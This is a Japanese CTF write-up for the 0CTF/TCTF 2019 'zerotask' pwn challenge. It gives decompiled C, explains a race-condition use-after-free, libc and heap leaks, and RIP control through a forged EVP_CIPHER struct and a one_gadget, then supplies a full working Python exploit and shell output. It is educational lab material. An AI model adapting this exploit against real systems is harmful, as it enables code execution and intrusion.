# [pwn 132pts] zerotask - 0CTF/TCTF 2019 Quals
64ビットバイナリで，セキュリティ機構が有効になっています．
```
$ checksec task_52f1358baddfd3d4026da4d8c0735e52
[*] 'task_52f1358baddfd3d4026da4d8c0735e52'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP enabled (Canary found)
    RELRO:	Full RELRO
    PIE:	PIE enabled
```
今までいろいろやってきましたが，ヒープ系の問題は脆弱性を探すためにCに直すと分かりやすいです．
ということで，IDAで解析してC言語に翻訳しましょう．

```c
char *tasks;

typedef struct {
  char *data; // 0x00
  long size;  // 0x08
  int x0;
  char key[0x20]; // 0x14
  char iv[0x10]; // 0x34
  int x1;
  long x2;
  EVP_CIPHER_CTX *ctx; // 0x58
  long id; // 0x60
  char *next; // 0x68
} st_task;

void handler()
{
  puts("\n[!] bye!");
  exit(1);
}

void setup()
{
  signal(0xE, handler);
  alarm(0x20);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  tasks = malloc(0x1010);
}

void show_menu()
{
  puts("1. Add task");
  puts("2. Delete task");
  puts("3. Go");
  printf("Choice: ");
}

int read_int()
{
  char str_val[0x18];
  memset(str_val, 0, 8);
  readuntil(str_val, 8, 0xA);
  return atoi(str_val);
}

void add_task()
{
  int id, mode;
  printf("Task id: ");
  id = read_int();
  printf("Encrypt(1) / Decrypt(2): ");
  mode = read_int();
  if (mode == 1 || mode == 2) {
    st_task *task = malloc(0x70);
    if (do_cipher(task, mode) == 0) {
      task->id = id;
      task->next = tasks;
    }
  }
}

void delete_task()
{
  int id;
  st_task *ptr1, *ptr2;
  ptr1 = tasks;
  ptr2 = tasks;
  
  printf("Task id: ");
  id = read_int();
  if (tasks != NULL && id == tasks->id) {
    tasks = tasks->next;
    EVP_CIPHER_CTX_free(ptr1->ctx);
    free(ptr1->data);
    free(ptr1);
  } else {
    for(ptr1 = NULL; ptr1->id != id; ptr1 = ptr1->next) {
      ptr2 = ptr1;
    }
    ptr2->next = ptr1->next;
    EVP_CIPHER_CTX_free(ptr1->ctx);
    free(ptr1->data);
    free(ptr1);
  }
}

void do_cipher(st_task *task, int mode)
{
  printf("Key : ");
  read_str(task->key, 0x20);
  printf("IV : ");
  read_str(task->iv, 0x10);
  printf("Data size : ");
  size = read_int();
  if (0 < size && size <= 0x1000) {
    task->ctx = EVP_CIPHER_CTX_new();
    if (mode == 1) {
      EVP_EncryptInit_ex(task->ctx, EVP_aes_256_cbc(), 0, key, iv);
    } else if (mode == 2) {
      EVP_DecryptInit_ex(task->ctx, EVP_aes_256_cbc(), 0, key, iv);
    }
    task->mode = mode;
    task->data = malloc(task->size);
    printf("Data : ");
    read_str(task->data, task->size);
  }
}

void worker(st_task *task2pass)
{
  int outlen, offset = 0;
  puts("Prepare...");
  sleep(2);
  memset(output, 0, 0x1010);
  if (!EVP_CipherUpdate(task->ctx, output, outlen, task->data, task->size)) {
    pthread_exit(0);
  }
  offset += outlen;
  if (!EVP_CipherFinal_ex(task->ctx, output + offset, outlen)) {
    pthread_exit(0);
  }
  offset += outlen;
  puts("Ciphertext: ");
  print_hex(stdout, output, offset, 0x10, 1);
  pthread_exit(0);
}

void go()
{
  st_task *task2pass;
  long id;
  printf("Task id : ");
  id = read_int();
  task2pass = tasks;
  if (task2pass != NULL) {
    while(task2pass->id != id) {
      task2pass = task2pass->next;
    }
    pthread_create(thread, 0, worker, task2pass);
  }
}

int main(int argc, char **argv)
{
  int n, choice;
  setup();
  while(1) {
    show_menu();
    choice = read_int();
    if (choice == 1) {
      add_task();
    } else if (choice == 2) {
      delete_task();
    } else if (choice == 3) {
      if (n <= 2) {
	go();
	n += 1;
      } else {
	puts("bye");
	exit(1);
      }
    } else {
      puts("bye");
      exit(1);
    }
  }
  return 0;
}
```

〜数ヶ月後〜

昔の私はここで死んでいたのですが、しばらくしてやってみたらさくさく解けました。
とりあえずworkerにrace conditionがあるのでUAFができます。tcacheが有効なので使い果たしてunsorted binにつなげて、それをUAFで取得してlibc leakします。
次にRIPを制御する方法を考えます。今回は暗号化・復号化した結果はoutというバッファに書き込まれるため特定のアドレスを書き変えることは無理そうです。そこでctxを使うことにしました。EVP_CIPHER_CTXの先頭にあるcipherポインタはEVP_CIPHER構造体ですが、これにはcleanupなどの関数ポインタが含まれています。
```
pwndbg> x/8xg 0x00007ffff7b98620
0x7ffff7b98620: 0x00000010000001ab      0x0000001000000020
0x7ffff7b98630: 0x0000000000001002      0x00007ffff7896ee0
0x7ffff7b98640: 0x00007ffff7896eb0      0x0000000000000000
0x7ffff7b98650: 0x0000000000000108      0x0000000000000000
pwndbg> x/4i 0x00007ffff7896eb0
   0x7ffff7896eb0:      sub    rsp,0x8
   0x7ffff7896eb4:      mov    rax,rdx
   0x7ffff7896eb7:      mov    r9d,DWORD PTR [rdi+0x10]
   0x7ffff7896ebb:      mov    rdx,rcx
```
偽のEVP_CIPHER構造体をヒープ上に作って、さらにそのcipherが偽のEVP_CIPHER構造体を指すようにすれば良さそうです。とりあえずヒープのアドレスが必要なのでmain_arenaあたりから適当に読みます。

さて、one gadgetを動かすのですが、スタックの様子を見ると使えそうなものがありません。rcx==NULLを使ってもmovapsで死にます。ということでone gadgetの前に1つcallを挟むgadgetを探しましょう。
関数ポインタが呼ばれる際のレジスタの様子は次のようになっています。
```
 RAX  0x55555575a680 ◂— 0x10000001ab
 RBX  0x7ffff5f62ec4 ◂— 0x55759fb000000000
 RCX  0x10
 RDX  0x55555575a3c8 ◂— 0x0
 RDI  0x55555575a390 —▸ 0x55555575a680 ◂— 0x10000001ab
 RSI  0x555555757260 ◂— 0x0
 R8   0x78
 R9   0x8
 R10  0x8
 R11  0x0
 R12  0x55555575a140 ◂— 0x0
 R13  0x555555757260 ◂— 0x0
 R14  0x10
 R15  0x10
 RBP  0x55555575a390 —▸ 0x55555575a680 ◂— 0x10000001ab
 RSP  0x7ffff5f62e58 —▸ 0x7ffff7893970 (EVP_EncryptUpdate+240) ◂— test   eax, e…
 RIP  0x7ffff73d12c5 (do_system+1045) ◂— lea    rsi, [rip + 0x39e3d4]
```
rdxは制御可能なアドレスを指しているので`call [rdx]`を探します。
```
0x00009678: call qword [rdx] ;  (67 found)
```
これをはさみましょう。
```python
from ptrlib import *
from Crypto.Cipher import AES

def add_task_wait(task_id, mode, key, iv, size):
    assert len(key) == 0x20
    assert len(iv) == 0x10
    assert 0 < size <= 0x1000
    sock.recvuntil("Choice: ")
    sock.sendline("1")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))
    sock.recvuntil("(2): ")
    sock.sendline(str(mode))
    sock.recvuntil("Key : ")
    sock.send(key)
    sock.recvuntil("IV : ")
    sock.send(iv)
    sock.recvuntil("Size : ")
    sock.sendline(str(size))

def add_task(task_id, mode, key, iv, size, data):
    add_task_wait(task_id, mode, key, iv, size)
    sock.recvuntil("Data : ")
    sock.send(data)

def delete_task(task_id):
    sock.recvuntil("Choice: ")
    sock.sendline("2")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))
    
def go(task_id):
    sock.recvuntil("Choice: ")
    sock.sendline("3")
    sock.recvuntil("id : ")
    sock.sendline(str(task_id))

def recv_cipher():
    sock.recvuntil("Ciphertext:")
    sock.recvline()
    data = b''
    while True:
        line = sock.recvline(timeout=0.5).rstrip()
        if line == b'' or line == None:
            break
        else:
            data += bytes.fromhex(bytes2str(line.replace(b' ', b'')))
    return data

def decrypt(cipher, key, iv):
    c = AES.new(key, AES.MODE_CBC, iv)
    return c.decrypt(cipher)

libc = ELF("./libc-2.27.so")
sock = Process("./task_52f1358baddfd3d4026da4d8c0735e52")
libc_main_arena = 0x3ebc40
libc_one_gadget = 0x10a38c
rop_call_rdx = 0x00009678

key = b'\xff' * 0x20
iv = b'\xff' * 0x10

# leak libc
add_task(100, 1, key, iv, 0x88, b'A' * 0x88)
delete_task(100)
add_task(0, 1, key, iv, 0x98, b'B' * 0x98)
for i in range(7):
    add_task(i+1, 1, key, iv, 0x98, b'A' * 0x98)
add_task(8, 1, key, iv, 0x88, b'A' * 0x88)
for i in range(7):
    delete_task(i+1)
go(0)
delete_task(0)
for i in range(7):
    add_task(i+1, 1, key, iv, 0x98, b'0' * 0x98)
add_task_wait(0, 1, key, iv, 0x98)
cipher = recv_cipher()
libc_base = u64(decrypt(cipher, key, iv)[:8]) - libc_main_arena - 0xf0
logger.info("libc = " + hex(libc_base))
sock.send(b'X' * 0x98)

# heap leak
"""
tcache[0xa0] --> (task0->data)
tcache[0x80] --> (task10) --> (task10->data) --> (task0)
"""
add_task(10, 1, key, iv, 0x78, b'1' * 0x78)
go(0)
delete_task(0)
delete_task(10)
add_task(10, 1, key, iv, 0x98, b'X' * 0x98)
add_task_wait(0, 1, key, iv, 0x78)
sock.send(p64(libc_base + libc_main_arena))
cipher = recv_cipher()
addr_heap = u64(decrypt(cipher, key, iv)[0x60:0x68]) # main_arena->top
logger.info("heap = " + hex(addr_heap))
sock.send(b'X' * 0x70)

# prepare fake EVP_CIPHER_CTX and EVP_CIPHER
fake_cipher_ctx  = p64(addr_heap + 0x540)
fake_cipher_ctx += p64(0)
fake_cipher_ctx += p32(1) + p32(8)
fake_cipher_ctx += iv * 2
fake_cipher_ctx += p64(libc_base + libc_one_gadget) # call [rdx]
fake_cipher_ctx += b'\x00' * (0xa8 - len(fake_cipher_ctx))
add_task(20, 1, key, iv, 0xa8, fake_cipher_ctx)
fake_cipher  = p32(0x1ab) + p32(0x10) # <-- assert rcx == 0
fake_cipher += p32(0x20) + p32(0x10)
fake_cipher += p64(0x1002)
fake_cipher += p64(0xffffffffffffffff)
fake_cipher += p64(libc_base + rop_call_rdx)
fake_cipher += b'\x00' * (0x30 - len(fake_cipher))
add_task(21, 1, key, iv, 0x30, fake_cipher)

# get the shell!
"""
tcache[0xa0] --> (task0->data)
tcache[0x80] --> (task30) --> (task30->data) --> (task0)
"""
logger.info("Executing shell...")
add_task(30, 1, key, iv, 0x78, b'1' * 0x78)
go(0)
delete_task(0)
delete_task(30)
add_task(30, 1, key, iv, 0x98, b'X' * 0x98)
add_task_wait(0, 1, key, iv, 0x78)
payload = p64(addr_heap)
payload += p64(0x78)
payload += p32(1)
payload += key
payload += iv
payload += p32(0) + p64(0) + p64(0)
payload += p64(addr_heap + 0x250)
sock.send(payload)

sock.interactive()
```

いえいいえい！
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=16910)
[WARN] recvonce: Received nothing
[+] <module>: libc = 0x7ffff7382000
[WARN] recvonce: Received nothing
[+] <module>: heap = 0x55555575a140
[+] <module>: Executing shell...
[ptrlib]$ id
Data : uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
面白かったです。昔解けなかったものが解けるようになってると楽しい。

# 参考文献
[1] [https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP](https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP)